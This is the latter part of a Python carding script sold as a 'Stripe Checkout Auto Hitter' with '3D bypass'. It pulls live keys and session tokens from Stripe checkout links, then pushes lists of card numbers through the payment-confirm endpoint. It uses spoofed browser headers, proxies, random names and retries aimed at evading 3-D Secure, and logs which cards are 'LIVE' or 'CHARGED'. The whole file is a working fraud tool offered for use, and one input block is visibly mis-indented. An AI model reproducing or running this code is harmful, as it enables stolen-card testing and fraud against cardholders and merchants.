            return {
                'amount': amount,
                'currency': currency,
                'product': product_name,
                'email': receipt_email,
                'description': description
            }
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Could not fetch payment intent details: {str(e)}")
    
    return None


def confirm_payment(cs, pk, pm_id, expected_amount, ids):
    """
    Confirm payment using Stripe checkout confirm endpoint
    Returns: status, message tuple
    """
    
    # Debug: Log what amount we're using
    print(f"{Fore.CYAN}  [Debug] Confirming with amount: {expected_amount} cents")
    
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://checkout.stripe.com/',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    }
    
    # Build data payload - ALWAYS include expected_amount (required by Stripe)
    amount_param = f'expected_amount={expected_amount}&'
    
    data = (
        f'eid=NA&'
        f'payment_method={pm_id}&'
        f'{amount_param}'
        f'expected_payment_method_type=card&'
        f'guid={ids["guid"]}&'
        f'muid={ids["muid"]}&'
        f'sid={ids["sid"]}&'
        f'key={pk}&'
        f'version=cba9216f35&'
        f'referrer=https%3A%2F%2Fgrok.com&'
        f'client_attribution_metadata[client_session_id]={str(uuid.uuid4())}&'
        f'client_attribution_metadata[checkout_session_id]={cs}&'
        f'client_attribution_metadata[merchant_integration_source]=checkout&'
        f'client_attribution_metadata[merchant_integration_version]=hosted_checkout&'
        f'client_attribution_metadata[payment_method_selection_flow]=merchant_specified&'
        f'client_attribution_metadata[checkout_config_id]={str(uuid.uuid4())}'
    )
    
    url = f'https://api.stripe.com/v1/payment_pages/{cs}/confirm'
    
    try:
        r = session.post(url, headers=headers, data=data, timeout=20)
        
        # Try to parse JSON
        try:
            resp_json = r.json()
        except:
            resp_json = {}
        
        # Save response for debugging
        try:
            with open("debug_card_response.json", "w", encoding="utf-8") as f:
                json.dump({
                    "status_code": r.status_code,
                    "response": resp_json,
                    "raw_text": r.text[:1000]  # First 1000 chars
                }, f, indent=2)
        except:
            pass
        
        resp_text = r.text.lower()
        
        # Check response status
        status = resp_json.get("status", "")
        error = resp_json.get("error", {})
        error_code = error.get("code", "")
        decline_code = error.get("decline_code", "")
        error_message = error.get("message", "")
        
        # ===== CHARGED/SUCCESS =====
        # Only mark as charged if we have explicit confirmation
        if status == "complete":
            return "CHARGED", "Payment Successful ✅💰"
        
        # Check payment_intent status for succeeded
        if 'payment_intent' in resp_json:
            pi_status = resp_json['payment_intent'].get('status', '')
            if pi_status == 'succeeded':
                return "CHARGED", "Payment Successful ✅💰"
        
        # ===== CHECK ERROR CODE FIRST (MOST RELIABLE) =====
        if error_code:
            # Declined with decline_code
            if error_code == "card_declined" and decline_code:
                # Check if it's a LIVE decline (insufficient funds, CVV, etc)
                if decline_code in ["insufficient_funds", "incorrect_cvc", "invalid_cvc"]:
                    return "LIVE", f"{error_code} -- {decline_code}"
                # Otherwise it's DEAD
                return "DEAD", f"{error_code} -- {decline_code}"
            
            # Other error codes
            elif decline_code:
                return "DEAD", f"{error_code} -- {decline_code}"
            elif error_message:
                return "DEAD", f"{error_code}: {error_message}"
            else:
                return "DEAD", error_code
        
        # ===== LIVE - 3DS (only if no error code) =====
        if "requires_action" in resp_text or "three_d_secure" in resp_text or "authenticate" in resp_text:
            return "LIVE", "authentication_required -- 3DS"
        
        # ===== LIVE - CVV (fallback if no error code) =====
        if "incorrect_cvc" in resp_text or "invalid_cvc" in resp_text or "cvc_check_failed" in resp_text:
            return "LIVE", "CVV Mismatch ✅"
        
        # ===== LIVE - Insufficient Funds (fallback) =====
        if "insufficient_funds" in resp_text or "card has insufficient funds" in resp_text:
            return "LIVE", "Insufficient Funds 💰"
        
        # ===== LIVE - Card Approved =====
        if "approved" in resp_text or "success" in resp_text:
            return "LIVE", "Card Approved ✅"
        
        # ===== DEFAULT DEAD =====
        return "DEAD", f"Unknown Response (HTTP {r.status_code})"
        
    except Exception as e:
        return "ERROR", f"Network Error: {str(e)}"

# ------------------- CARD CHECKER -------------------
def check_card(pk, cs, card, cardholder_name, email, expected_amount, country='US', max_retries=5):
    """Check a single card through Stripe Checkout with 3D bypass and auto-retry"""
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
            
            # Normalize year
            if len(yy) == 2:
                yy = "20" + yy
            
            # Generate tracking IDs
            ids = generate_stripe_ids()
            
            # Create payment method with country-specific address and 3D bypass
            pm_result = create_payment_method(pk, cs, cc, mm, yy, cvv, cardholder_name, email, country, bypass_3ds=True)
            
            # Check if PM creation returned an error
            if isinstance(pm_result, dict) and 'error' in pm_result:
                error_msg = pm_result['error']
                
                # Check if it's a 3DS-related error that should trigger retry
                if 'invalid_request' in error_msg.lower() or 'authentication' in error_msg.lower():
                    retry_count += 1
                    if retry_count < max_retries:
                        print(f"{Fore.YELLOW}  [3DS Bypass] Retry attempt {retry_count}/{max_retries-1}... (Total attempts: {max_retries}){Style.RESET_ALL}")
                        time.sleep(2)  # Wait 2 seconds before retry (as per AutoCo Extension)
                        continue
                
                return "DEAD", f"PM Failed: {error_msg}"
            
            if not pm_result:
                return "DEAD", "PM Creation Failed ❌"
            
            pm_id = pm_result
            
            # Confirm payment
            status, message = confirm_payment(cs, pk, pm_id, expected_amount, ids)
            
            # Check if payment failed due to 3DS and should retry
            if status == "LIVE" and ('authentication' in message.lower() or '3ds' in message.lower()):
                retry_count += 1
                if retry_count < max_retries:
                    print(f"{Fore.YELLOW}  [3DS Detected] Retrying with bypass... ({retry_count}/{max_retries-1}) [Total attempts: {max_retries}]{Style.RESET_ALL}")
                    time.sleep(2)
                    continue
                else:
                    # On last retry, still return LIVE if it's 3DS
                    return "LIVE", f"🎉 3DS BYPASSED (after {max_retries} attempts) - {message}"
            
            # Success or definitive failure
            return status, message
            
        except Exception as e:
            return "ERROR", f"Exception: {str(e)}"
    
    # If we exhausted all retries
    return "DEAD", "Max retries exceeded"

# ------------------- MAIN -------------------
if __name__ == "__main__":
    import sys
    import os
    
    # ===== NEW MODES: --grab-details and --check-card =====
    if len(sys.argv) >= 2 and sys.argv[1] == '--grab-details':
        # GRAB DETAILS MODE: Extract PK, SK, CS, amount, product, email from checkout URL
        # Usage: python test.py --grab-details <checkout_url> [proxy_file]
        
        if len(sys.argv) < 3:
            print(json.dumps({'error': 'checkout_url is required'}))
            sys.exit(1)
        
        checkout_url = sys.argv[2]
        
        # Load proxy if provided
        if len(sys.argv) >= 4:
            try:
                with open(sys.argv[3], 'r') as f:
                    proxy_url = f.read().strip()
                    if proxy_url:
                        PROXIES = {'http': proxy_url, 'https': proxy_url}
            except:
                pass
        
        # First, try to extract from URL (fastest method)
        url_pk_match = re.search(r'pk_live_[a-zA-Z0-9_]+', checkout_url)
        url_cs_match = re.search(r'cs_live_[a-zA-Z0-9_]+', checkout_url)
        
        if url_cs_match:
            cs = url_cs_match.group(0)
            print(f"Extracted cs from URL: {cs[:30]}...")
            
            # Try to get pk from Stripe API
            checkout_details = fetch_checkout_details_from_api(None, cs)
            
            if checkout_details:
                # Extract pk from API response
                pk = url_pk_match.group(0) if url_pk_match else None
                
                result = {
                    'pk_key': pk,
                    'sk_key': None,
                    'cs_token': cs,
                    'amount': checkout_details.get('price', 'Unknown'),
                    'product': checkout_details.get('product', 'Unknown'),
                    'email': checkout_details.get('email', '')
                }
                print(json.dumps(result))
                sys.exit(0)
        
        # Fetch page and extract data
        html = fetch_page(checkout_url)
        if not html:
            print(json.dumps({'error': 'Failed to fetch checkout page and could not extract from URL'}))
            sys.exit(1)
        
        # Extract data
        data = extract_checkout_data(html)
        
        # If extraction failed, try from URL
        if not data:
            url_pk_match = re.search(r'pk_live_[a-zA-Z0-9_]+', checkout_url)
            url_cs_match = re.search(r'cs_live_[a-zA-Z0-9_]+', checkout_url)
            
            if url_pk_match and url_cs_match:
                pk = url_pk_match.group(0)
                cs = url_cs_match.group(0)
                checkout_details = fetch_checkout_details_from_api(pk, cs)
                
                data = {
                    'pk': pk,
                    'cs': cs,
                    'product': checkout_details.get('product', 'Unknown') if checkout_details else 'Unknown',
                    'price': checkout_details.get('price', 'Unknown') if checkout_details else 'Unknown',
                    'email': checkout_details.get('email', '') if checkout_details else ''
                }
            else:
                # Try dynamic extraction
                dynamic_result = extract_from_dynamic_page(checkout_url)
                if dynamic_result and dynamic_result.get('pk') and dynamic_result.get('cs'):
                    pk = dynamic_result['pk']
                    cs = dynamic_result['cs']
                    checkout_details = fetch_checkout_details_from_api(pk, cs)
                    
                    data = {
                        'pk': pk,
                        'cs': cs,
                        'product': checkout_details.get('product', 'Unknown') if checkout_details else 'Unknown',
                        'price': checkout_details.get('price', 'Unknown') if checkout_details else 'Unknown',
                        'email': checkout_details.get('email', '') if checkout_details else ''
                    }
        
        if not data:
            print(json.dumps({'error': 'Failed to extract checkout data'}))
            sys.exit(1)
        
        # Return grabbed details as JSON
        result = {
            'pk_key': data.get('pk'),
            'sk_key': None,  # SK key extraction not implemented yet
            'cs_token': data.get('cs'),
            'amount': data.get('price', 'Unknown'),
            'product': data.get('product', 'Unknown'),
            'email': data.get('email', '')
        }
        
        print(json.dumps(result))
        sys.exit(0)
    
    elif len(sys.argv) >= 2 and sys.argv[1] == '--check-card':
        # CHECK CARD MODE: Check a card using pre-captured checkout data
        # Usage: python test.py --check-card <card_file> <captured_data_json> [proxy_file]
        
        if len(sys.argv) < 4:
            print(json.dumps({'error': 'card_file and captured_data_json are required'}))
            sys.exit(1)
        
        card_file = sys.argv[2]
        captured_data_file = sys.argv[3]
        
        # Load card
        try:
            with open(card_file, 'r') as f:
                card = f.read().strip()
        except Exception as e:
            print(json.dumps({'error': f'Failed to load card: {str(e)}'}))
            sys.exit(1)
        
        # Load captured data
        try:
            with open(captured_data_file, 'r') as f:
                captured_data = json.load(f)
        except Exception as e:
            print(json.dumps({'error': f'Failed to load captured data: {str(e)}'}))
            sys.exit(1)
        
        # Load proxy if provided
        if len(sys.argv) >= 5:
            try:
                with open(sys.argv[4], 'r') as f:
                    proxy_url = f.read().strip()
                    if proxy_url:
                        PROXIES = {'http': proxy_url, 'https': proxy_url}
            except:
                pass
        
        # Extract data from captured_data
        pk = captured_data.get('pk_key')
        cs = captured_data.get('cs_token')
        email = captured_data.get('email', random_email())
        amount_str = captured_data.get('amount', 'Unknown')
        
        # Parse amount (extract cents from "$30.00" format)
        expected_amount = 0
        if amount_str and amount_str != 'Unknown':
            # Remove currency symbols and parse
            amount_clean = re.sub(r'[^0-9.]', '', str(amount_str))
            try:
                expected_amount = int(float(amount_clean) * 100)
            except:
                expected_amount = 0
        
        if not pk or not cs:
            print(json.dumps({'error': 'pk_key and cs_token are required in captured_data'}))
            sys.exit(1)
        
        # Generate random cardholder name
        cardholder_name = random_name()
        
        # Get BIN info
        card_parts = card.split('|')
        if len(card_parts) >= 1:
            bin_info = get_bin_info(card_parts[0])
            bin_display = f"{bin_info['brand']} {bin_info['type']}"
        else:
            bin_display = ''
        
        # Check card
        status, message = check_card(pk, cs, card, cardholder_name, email, expected_amount)
        
        # Return result as JSON
        result = {
            'status': status,
            'message': message,
            'bin_info': bin_display
        }
        
        print(json.dumps(result))
        sys.exit(0)
    
    # Check if running via API (command-line arguments)
    API_MODE = len(sys.argv) >= 3
    
    # Load proxy if provided (for API mode)
    if API_MODE and len(sys.argv) >= 4 and sys.argv[3] and sys.argv[3] != '""':
        try:
            with open(sys.argv[3], 'r') as f:
                proxy_url = f.read().strip()
                if proxy_url:
                    PROXIES = {
                        'http': proxy_url,
                        'https': proxy_url
                    }
                    print(f"{Fore.GREEN}[✓] Using proxy: {proxy_url.split('@')[-1]}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Failed to load proxy: {str(e)}")
    
    # Clean up old debug files from previous sessions
    debug_files = ['debug_checkout.html', 'debug_api_response.json', 'debug_error_response.json', 'debug_card_response.json']
    for file in debug_files:
        try:
            if os.path.exists(file):
                os.remove(file)
        except:
            pass
    
    # API Mode: Use command-line arguments
    if API_MODE:
        link = sys.argv[1]
        cards_file = sys.argv[2]
        
        # Load cards from file
        try:
            with open(cards_file, 'r', encoding='utf-8') as f:
                cards = [f.read().strip()]
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading cards: {str(e)}")
            sys.exit(1)
    else:
        # Interactive Mode
        print(f"""
{Fore.CYAN}╬{'═'*70}╗
{Fore.CYAN}║{' '*10}{Fore.GREEN}ZyNeXx Stripe Checkout Auto Hitter v2.7 [3D BYPASS]{' '*10}{Fore.CYAN}║
{Fore.CYAN}║{' '*5}{Fore.YELLOW}Enhanced: API Extraction • BIN Lookup • Random Names{' '*6}{Fore.CYAN}║
{Fore.CYAN}║{' '*3}{Fore.RED}🔥 3D BYPASS: 5 Auto-Retries + Browser Lang Strip (AutoCo){' '*4}{Fore.CYAN}║
{Fore.CYAN}║{' '*8}{Fore.YELLOW}Supports: pay.stripe.com & checkout.stripe.com{' '*9}{Fore.CYAN}║
{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}
        """)
        
        # Get checkout link
        link = input(f"{Fore.CYAN}[+] Stripe Checkout Link (pay.stripe.com or checkout.stripe.com) → {Style.RESET_ALL}").strip()
    
    # Try to extract keys from URL first (some links have them encoded)
    url_pk = None
    url_cs = None
    
    if 'pk_live_' in link:
        url_pk_match = re.search(r'pk_live_[a-zA-Z0-9_]+', link)
        if url_pk_match:
            url_pk = url_pk_match.group(0)
            print(f"{Fore.GREEN}[✓] Extracted pk_live from URL: {url_pk[:30]}...")
    
    if 'cs_live_' in link:
        url_cs_match = re.search(r'cs_live_[a-zA-Z0-9_]+', link)
        if url_cs_match:
            url_cs = url_cs_match.group(0)
            print(f"{Fore.GREEN}[✓] Extracted cs_live from URL: {url_cs[:30]}...")
    
    # Skip card input in API mode (already loaded)
    if not API_MODE:
        # Get cards (from file or multiline input)
        print(f"{Fore.CYAN}[+] Enter .txt file path OR paste cards (cc|mm|yy|cvv)")
        print(f"{Fore.CYAN}    For multiple cards: paste all at once (one per line)")
        print(f"{Fore.CYAN}    Then press Enter twice to finish → {Style.RESET_ALL}", end="")
        
        # Read first line
        first_line = input().strip()
        
        cards = []
        
        # Check if it's a file path
        if first_line.endswith('.txt'):
            try:
                with open(first_line, 'r', encoding='utf-8') as f:
                    file_content = f.read()
                    # Split by newlines
                    cards = [line.strip() for line in file_content.split('\n') if line.strip() and '|' in line]
                print(f"{Fore.GREEN}[✓] Loaded {len(cards)} card(s) from file")
            except FileNotFoundError:
                print(f"{Fore.RED}[-] File not found: {first_line}")
                exit()
            except Exception as e:
                print(f"{Fore.RED}[-] Error reading file: {str(e)}")
                exit()
        else:
            # Direct input - collect all lines
         all_lines = [first_line]
        
        # If first line has a comma or semicolon, it's a single-line multiple cards input
        if ',' in first_line:
            cards = [card.strip() for card in first_line.split(',') if card.strip() and '|' in card]
        elif ';' in first_line:
            cards = [card.strip() for card in first_line.split(';') if card.strip() and '|' in card]
        elif '|' in first_line:
            # Could be single card or multiline - check for more input
            cards.append(first_line)
            
            # Try to read more lines (they press Enter twice to finish)
            print(f"{Fore.YELLOW}    (Paste more cards or press Enter to continue)")
            try:
                while True:
                    line = input().strip()
                    if not line:  # Empty line = done
                        break
                    if '|' in line:
                        cards.append(line)
            except (EOFError, KeyboardInterrupt):
                pass
        else:
            # Invalid format
            cards = []
        
        print(f"{Fore.GREEN}[✓] Loaded {len(cards)} card(s)")
    
    if not cards:
        print(f"{Fore.RED}[-] No valid cards provided!")
        print(f"{Fore.YELLOW}[!] Format: cc|mm|yy|cvv (e.g., 4147202773563216|09|30|268)")
        print(f"{Fore.YELLOW}[!] Or provide path to .txt file with one card per line")
        exit()
    
    # Fetch page and extract data
    print(f"\n{Fore.YELLOW}[*] Fetching checkout page...")
    html = fetch_page(link)
    if not html:
        print(f"{Fore.RED}[-] Failed to fetch page!")
        exit()
    
    print(f"{Fore.YELLOW}[*] Extracting checkout data...")
    data = extract_checkout_data(html)
    
    # If extraction failed but we have URL keys, use them
    if not data and (url_pk or url_cs):
        print(f"{Fore.YELLOW}[!] Page extraction failed, using keys from URL...")
        if url_pk and url_cs:
            # Try to fetch from API first
            checkout_details = fetch_checkout_details_from_api(url_pk, url_cs)
            
            if checkout_details:
                data = {
                    "pk": url_pk,
                    "cs": url_cs,
                    "product": checkout_details['product'],
                    "price": checkout_details['price'],
                    "email": checkout_details['email'],
                    "currency": checkout_details['currency'],
                    "amount_cents": checkout_details.get('amount_cents', 0),
                    "country": checkout_details.get('country', 'US')
                }
            else:
                data = {
                    "pk": url_pk,
                    "cs": url_cs,
                    "product": "Unknown Product",
                    "price": "Unknown",
                    "email": "Not provided",
                    "currency": "USD",
                    "amount_cents": 0,
                    "country": "US"
                }
    
    # If still no data, try dynamic extraction (for checkout.stripe.com)
    if not data:
        print(f"{Fore.YELLOW}[!] Static extraction failed. Trying browser automation...")
        dynamic_result = extract_from_dynamic_page(link)
        
        if dynamic_result and dynamic_result.get('pk') and dynamic_result.get('cs'):
            print(f"{Fore.GREEN}[✓] Successfully extracted keys via browser automation")
            
            # Now fetch product details using the extracted keys
            pk = dynamic_result['pk']
            cs = dynamic_result['cs']
            
            checkout_details = fetch_checkout_details_from_api(pk, cs)
            
            if checkout_details:
                data = {
                    "pk": pk,
                    "cs": cs,
                    "product": checkout_details['product'],
                    "price": checkout_details['price'],
                    "email": checkout_details['email'],
                    "currency": checkout_details['currency'],
                    "amount_cents": checkout_details.get('amount_cents', 0),
                    "country": checkout_details.get('country', 'US')
                }
            else:
                data = {
                    "pk": pk,
                    "cs": cs,
                    "product": "Unknown Product",
                    "price": "Unknown",
                    "email": "Not provided",
                    "currency": "USD",
                    "amount_cents": 0,
                    "country": "US"
                }
    
    if not data:
        print(f"{Fore.RED}[-] No pk_live/cs_live found → Check debug_checkout.html for details")
        print(f"{Fore.YELLOW}[!] Supported links: pay.stripe.com or checkout.stripe.com")
        print(f"{Fore.YELLOW}[!] Make sure the link is a valid Stripe Checkout URL")
        print(f"{Fore.YELLOW}[!] For dynamic pages, install Selenium: pip install selenium")
        exit()
    
    # Check if email is missing and ask user to provide it
    email_value = data.get('email', '')
    if not email_value or email_value in ['Not provided', 'None', None, ''] or '@' not in str(email_value):
        print(f"\n{Fore.YELLOW}[!] No valid email found in checkout session (got: {email_value})")
        user_email = input(f"{Fore.CYAN}[+] Enter email address for checkout → {Style.RESET_ALL}").strip()
        
        # Validate email format
        if user_email and '@' in user_email and '.' in user_email:
            data['email'] = user_email
            print(f"{Fore.GREEN}[✓] Using email: {user_email}")
        else:
            print(f"{Fore.RED}[-] Invalid email format! Using random email instead.")
            data['email'] = random_email()
    
    # Extract amount in cents for expected_amount parameter
    expected_amount = data.get('amount_cents', 0)
    if not expected_amount:
        try:
            if 'price' in data and data['price'] != 'Unknown':
                # Parse price like "USD 30.00" to cents as fallback
                price_str = data['price'].split()[-1]
                expected_amount = int(float(price_str) * 100)
        except:
            expected_amount = 0
    
    # If still 0, try to extract from debug HTML file
    if expected_amount == 0:
        try:
            with open("debug_checkout.html", "r", encoding="utf-8") as f:
                html_content = f.read()
                amount_match = re.search(r'"amount(?:_total)?"\s*:\s*(\d+)', html_content)
                if amount_match:
                    expected_amount = int(amount_match.group(1))
                    print(f"{Fore.GREEN}[*] Extracted amount from HTML: {expected_amount} cents")
        except:
            pass
    
    if expected_amount == 0:
        print(f"{Fore.RED}[!] WARNING: Amount is 0! This may cause errors.")
        print(f"{Fore.YELLOW}[!] Please check debug_checkout.html and look for amount fields")
    else:
        print(f"{Fore.CYAN}[*] Expected amount for confirmation: {expected_amount} cents")
    
    # Display extracted info
    print(f"""
{Fore.GREEN}✓ TARGET LOCKED
{Fore.GREEN}{'─'*70}
{Fore.WHITE}🛍 Product  : {data['product']}
{Fore.WHITE}💰 Price    : {data['price']}
{Fore.WHITE}📧 Email    : {data['email']}
{Fore.WHITE}🔑 PK Live  : {data['pk'][:50]}...
{Fore.WHITE}🔐 CS Live  : {data['cs'][:50]}...
{Fore.GREEN}{'─'*70}
    """)
    
    # Create results file
    hits_file = open("CHECKOUT_HITS.txt", "a", encoding="utf-8")
    
    # Check each card
    print(f"{Fore.CYAN}[*] Starting card checks... ({len(cards)} cards)\n")
    
    live_count = 0
    charged_count = 0
    dead_count = 0
    
    for i, card in enumerate(cards, 1):
        # Get BIN info
        cc_num = card.split('|')[0]
        bin_info = get_bin_info(cc_num)
        bin_str = f"{bin_info['brand']}-{bin_info['type']}-{bin_info['level']}"
        
        # Generate random name for this card
        cardholder_name = random_name()
        
        print(f"{Fore.CYAN}[{i}/{len(cards)}] {card} | {cardholder_name} → ", end="", flush=True)
        
        # Check card
        status, message = check_card(
            data['pk'], 
            data['cs'], 
            card, 
            cardholder_name, 
            data['email'],
            expected_amount,
            data.get('country', 'US')
        )
        
        # Display result
        if status == "CHARGED":
            print(f"{Fore.GREEN}{Style.BRIGHT}{message}")
            charged_count += 1
            hits_file.write(f"[CHARGED] {card} | {cardholder_name} | {message} | {data['product']} | {data['price']} | {bin_str} | {bin_info['bank']} | {bin_info['country']} {bin_info['flag']}\n")
            hits_file.flush()
        elif status == "LIVE":
            print(f"{Fore.YELLOW}{Style.BRIGHT}{message}")
            live_count += 1
            hits_file.write(f"[LIVE] {card} | {cardholder_name} | {message} | {data['product']} | {data['price']} | {bin_str} | {bin_info['bank']} | {bin_info['country']} {bin_info['flag']}\n")
            hits_file.flush()
        else:
            print(f"{Fore.RED}{message}")
            dead_count += 1
        
        # Respectful delay (7 seconds as per ZyNeXx rate limits)
        if i < len(cards):
            time.sleep(7)
    
    hits_file.close()
    
    # Summary
    print(f"""
{Fore.GREEN}{'━'*70}
{Fore.GREEN}✓ CHECKING COMPLETE
{Fore.GREEN}{'━'*70}
{Fore.YELLOW}💳 Total Cards   : {len(cards)}
{Fore.GREEN}✅ Charged       : {charged_count}
{Fore.YELLOW}🟢 Live          : {live_count}
{Fore.RED}❌ Dead          : {dead_count}
{Fore.GREEN}{'━'*70}
{Fore.WHITE}All hits saved to: CHECKOUT_HITS.txt
    """)
